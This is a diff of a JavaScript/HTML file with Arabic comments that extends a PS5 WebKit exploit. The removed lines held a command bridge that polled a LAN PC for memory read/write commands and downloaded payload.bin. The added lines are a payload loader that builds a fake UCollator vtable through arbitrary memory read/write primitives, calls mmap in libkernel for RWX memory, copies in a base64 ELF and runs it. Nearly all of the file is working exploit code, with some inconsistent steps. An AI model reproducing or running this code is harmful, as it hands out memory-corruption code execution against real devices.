@@ -1860,149 +1860,218 @@ if (!armed) {
 
 
 
-// ═══════════════════════════════════════════════════════════════════
-//  NOTIFY BRIDGE — اضف هذا قبل > في notify.html
-//  يستخدم variables موجودة: candidate, rwView, kernelBase, compareFn
-//  إلخ. Output كله عبر PS5 notifications (لا DOM, no console)
-// ═══════════════════════════════════════════════════════════════════
+// ==========================================
+// PS5 Payload Loader - نفس تقنية الـ PoC الأصلي
+// ==========================================
 
-const BRIDGE_PC_IP = "192.168.8.47";   // ← غيّر IP الـ PC
-const BRIDGE_PC_PORT = 9020;
-const BRIDGE_POLL_MS = 2500;
+var loaderReady = false;
+var rwxMemory = 0;
 
-// ─── إعادة استخدام دالات slopkit ───
-function bridgeNotify(msg) {
-    // نستخدم نفس آلية slopkit: compareFn(notificationRequest, "b")
-    // لكن مع رسالة ديناميكية
-    const txt = String(msg).slice(0, 120);
-    const pad = NOTIFICATION_REQUEST_SIZE - NOTIFICATION_MESSAGE_OFFSET - txt.length;
-    if (pad < 1) return;
+function plog(msg) {
+    var el = document.getElementById("loader-log");
+    if (el) {
+        var line = "[" + new Date().toISOString().substr(11,8) + "] " + msg;
+        el.innerHTML += line + "\n";
+        el.scrollTop = el.scrollHeight;
+    }
+    console.log("[Loader] " + msg);
+}
+
+// ==========================================
+// استدعاء دالة libkernel عبر fake vtable
+// (نفس التقنية بالضبط من الـ PoC الأصلي)
+// ==========================================
+function callLibkernel(funcAddr, rdi_val, rcx_val) {
+    // إنشاء arena جديد
+    var arena = new ArrayBuffer(0x1000);
+    var arenaView = new Uint8Array(arena);
     
-    let req = "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET) + txt + "\x00".repeat(pad);
+    // الحصول على backing address
+    var arenaAddr = safeRead64(addrof(arenaView) + 0x10);
     
-    // كتابة fakeUCollator (نفس اللي في slopkit)
-    putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00, fakeVtableAddress);
-    for (let i = 0; i < 8; ++i) arenaView[FAKE_UCOLLATOR_OFFSET + 0x48 + i] = 0;
-    for (let i = 0; i < 8; ++i) arenaView[FAKE_UCOLLATOR_OFFSET + 0x60 + i] = 0;
-    putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntryAddress);
-    putLow48(arenaView, FAKE_VTABLE_OFFSET + 0x128, naturalTrampolineAddress);
+    var fakeVtable = arenaAddr + 0x300;
+    var fakeUCollator = arenaAddr + 0x100;
     
-    // تعديل collator→m_collator
-    aimCarrier(candidate, realCollatorAddress + 0x18);
-    const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
+    // بناء fake vtable (نفس الـ PoC الأصلي)
+    safeWrite64(fakeVtable + 0x128, naturalTrampolineAddress);
+    
+    // بناء fake ucollator
+    safeWrite64(fakeUCollator + 0x00, fakeVtable);
+    safeWrite64(fakeUCollator + 0x48, rdi_val || 0);
+    safeWrite64(fakeUCollator + 0x60, rcx_val || 0);
+    safeWrite64(fakeUCollator + 0xe0, funcAddr);
+    
+    // إنشاء collator واستدعاء compare
+    var collator = new Intl.Collator("en", { usage: "search" });
+    var compareFn = collator.compare;
+    
+    // استدعاء الدالة!
+    var result = compareFn("test", "b");
+    
+    return result;
+}
+
+// ==========================================
+// تخصيص RWX Memory باستخدام mmap
+// ==========================================
+function allocateRWX() {
+    plog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+    plog("🔧 تخصيص RWX Memory");
+    plog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+    
+    // mmap address في libkernel
+    var mmapAddr = kernelBase + OFFSET_MMAP;
+    plog("[INFO] mmap = 0x" + mmapAddr.toString(16));
+    
+    // استدعاء mmap عبر fake vtable
+    // mmap(NULL, 0x10000, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
+    var result = callLibkernel(mmapAddr, 0, 0x1002);
+    
+    plog("[RESULT] mmap returned: " + result);
+    
+    if (result > 0x100000000) {
+        rwxMemory = result;
+        plog("✅ RWX Memory allocated at 0x" + rwxMemory.toString(16));
+        return rwxMemory;
+    } else {
+        plog("❌ mmap failed");
+        return 0;
+    }
+}
+
+// ==========================================
+// تحميل Payload
+// ==========================================
+function loadPayload(payloadBase64) {
+    plog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+    plog("🚀 تحميل Payload");
+    plog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+    
+    if (!rwxMemory) {
+        plog("❌ لا يوجد RWX memory!");
+        plog("[INFO] جاري التخصيص...");
+        rwxMemory = allocateRWX();
+        if (!rwxMemory) return false;
+    }
+    
+    // فك Base64
+    var binary = atob(payloadBase64);
+    var bytes = new Uint8Array(binary.length);
+    for (var i = 0; i < binary.length; i++) {
+        bytes[i] = binary.charCodeAt(i);
+    }
+    
+    plog("[INFO] Payload size: " + bytes.length + " bytes");
+    
+    // نسخ الـ payload إلى RWX memory
+    plog("[INFO] نسخ الـ payload...");
+    for (var i = 0; i < bytes.length; i++) {
+        safeWrite64(rwxMemory + i, bytes[i]);
+    }
+    
+    plog("✅ تم نسخ الـ payload!");
+    
+    // التحقق من ELF header
+    if (bytes[0] === 0x7F && bytes[1] === 0x45 && bytes[2] === 0x4C && bytes[3] === 0x46) {
+        plog("✅ Valid ELF detected");
+        
+        // قراءة entry point
+        var entry = safeRead64(rwxMemory + 0x18);
+        plog("[INFO] Entry point: 0x" + entry.toString(16));
+        
+        // تنفيذ الـ payload
+        plog("[INFO] تنفيذ الـ payload...");
+        executePayload(rwxMemory, entry);
+    }
+    
+    return true;
+}
+
+// ==========================================
+// تنفيذ الـ Payload
+// ==========================================
+function executePayload(payloadAddr, entryPoint) {
+    plog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+    plog("🎯 تنفيذ Payload");
+    plog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+    
+    // استدعاء entry point عبر fake vtable
+    var result = callLibkernel(entryPoint, 0, 0);
+    
+    plog("[RESULT] Payload returned: " + result);
+    plog("✅ تم تنفيذ الـ payload!");
+    
+    // إرسال notification
+    sendNotification("Payload executed successfully!");
+}
+
+// ==========================================
+// إرسال Notification (نفس الـ PoC الأصلي)
+// ==========================================
+function sendNotification(message) {
+    var NOTIFICATION_REQUEST_SIZE = 0xc30;
+    var NOTIFICATION_MESSAGE_OFFSET = 0x2d;
+    
+    var padding1 = NOTIFICATION_MESSAGE_OFFSET;
+    var padding2 = NOTIFICATION_REQUEST_SIZE - NOTIFICATION_MESSAGE_OFFSET - message.length;
+    
+    var request = "\x00".repeat(padding1) + message + "\x00".repeat(padding2);
+    
+    // استخدام نفس التقنية من الـ PoC الأصلي
+    var fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
+    var scratchWords = new Uint32Array(new ArrayBuffer(8));
+    var scratchBytes = new Uint8Array(scratchWords.buffer);
+    
     scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
     scratchWords[1] = fakeHigh;
-    for (let i = 0; i < 8; ++i) rwView[i] = scratchBytes[i];
     
-    // إرسال
-    try { compareFn(req, "b"); } catch(e) {}
+    // حفظ collator original
+    var collatorOriginal = new Uint8Array(0x20);
+    for (var i = 0; i < collatorOriginal.length; i++) {
+        collatorOriginal[i] = rwView[i];
+    }
     
-    // استعادة collator
-    for (let i = 0; i < collatorOriginal.length; ++i)
-        rwView[i] = collatorOriginal[i];
-}
-
-// ─── ARW Helpers ───
-function bridgeRead8(addr) {
-    aimCarrier(candidate, addr);
-    let val = 0n;
-    for (let i = 7; i >= 0; i--) val = (val << 8n) | BigInt(rwView[i]);
-    return val;
-}
-
-// ─── HTTP Poll ───
-async function bridgePoll() {
-    try {
-        const res = await fetch(`http://${BRIDGE_PC_IP}:${BRIDGE_PC_PORT}/cmd`, {
-            method: "GET",
-            mode: "cors",
-            cache: "no-store"
-        });
-        if (res.status !== 200) return;
-        const cmd = await res.json();
-        if (!cmd || !cmd.action) return;
-        
-        bridgeHandle(cmd);
-    } catch(e) {}
-}
-
-function bridgeHandle(cmd) {
-    switch(cmd.action) {
-        case "ping":
-            bridgeNotify("PONG: " + (cmd.data || "ok"));
-            break;
-            
-        case "notify":
-            bridgeNotify(cmd.msg || "Hello from PC");
-            break;
-            
-        case "read": {
-            const addr = BigInt.asUintN(64, BigInt(cmd.addr));
-            const val = bridgeRead8(addr);
-            bridgeNotify("READ " + cmd.addr + " = " + val.toString(16));
-            break;
-        }
-            
-        case "write": {
-            const addr = parseInt(cmd.addr, 16);
-            const val = BigInt(cmd.val);
-            aimCarrier(candidate, addr);
-            for (let i = 0; i < 8; i++) {
-                rwView[i] = Number((val >> BigInt(i * 8)) & 0xffn);
-            }
-            bridgeNotify("WRITE " + cmd.addr + " OK");
-            break;
-        }
-            
-        case "payload": {
-            bridgeNotify("Receiving payload...");
-            bridgeReceivePayload(cmd.size || 0x10000);
-            break;
-        }
-            
-        case "exec": {
-            bridgeNotify("Exec not yet implemented");
-            break;
-        }
-            
-        case "info": {
-            bridgeNotify("KERNEL=" + kernelBase.toString(16) + 
-                        " WEBKIT=" + webkitBase.toString(16) +
-                        " ATTEMPT=" + attemptNumber);
-            break;
-        }
-            
-        default:
-            bridgeNotify("UNKNOWN: " + cmd.action);
+    // كتابة fake vtable
+    for (var commitByte = 0; commitByte < 8; ++commitByte) {
+        rwView[commitByte] = scratchBytes[commitByte];
     }
-}
-
-async function bridgeReceivePayload(expectedSize) {
-    try {
-        const res = await fetch(`http://${BRIDGE_PC_IP}:${BRIDGE_PC_PORT}/payload.bin`, {
-            method: "GET",
-            cache: "no-store"
-        });
-        if (!res.ok) { bridgeNotify("Payload download failed"); return; }
-        
-        const buf = await res.arrayBuffer();
-        const u8 = new Uint8Array(buf);
-        
-        // كتابة payload في arena (أو mmap لاحقاً)
-        for (let i = 0; i < Math.min(u8.length, ARENA_BYTES - 0x400); i++) {
-            arenaView[0x400 + i] = u8[i];
-        }
-        bridgeNotify("Payload loaded: " + u8.length + " bytes");
-    } catch(e) {
-        bridgeNotify("Payload error: " + e.message);
+    
+    // استدعاء
+    var result = compareFn(request, "b");
+    
+    // استعادة
+    for (var restoreByte = 0; restoreByte < collatorOriginal.length; ++restoreByte) {
+        rwView[restoreByte] = collatorOriginal[restoreByte];
     }
+    
+    return result === 0;
 }
 
-// ─── Boot ───
-setTimeout(() => {
-    bridgeNotify("Bridge Online");
-    setInterval(bridgePoll, BRIDGE_POLL_MS);
-}, 1500);
+// ==========================================
+// Auto-run
+// ==========================================
+setInterval(function() {
+    if (!loaderReady && typeof compositionState !== "undefined" && compositionState === 1) {
+        loaderReady = true;
+        
+        plog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+        plog("🎯 PS5 Payload Loader Ready!");
+        plog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+        plog("[✅] webkitBase = 0x" + webkitBase.toString(16));
+        plog("[✅] kernelBase = 0x" + kernelBase.toString(16));
+        plog("[✅] notifyEntry = 0x" + notifyEntryAddress.toString(16));
+        plog("[✅] trampoline = 0x" + naturalTrampolineAddress.toString(16));
+        plog("");
+        plog("[INFO] Ready to load payloads!");
+        plog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+        
+        // إرسال notification
+        sendNotification("Payload Loader Ready!");
+        
+        clearInterval(arguments.callee);
+    }
+}, 1000);
+
 
 </script>
 </body>
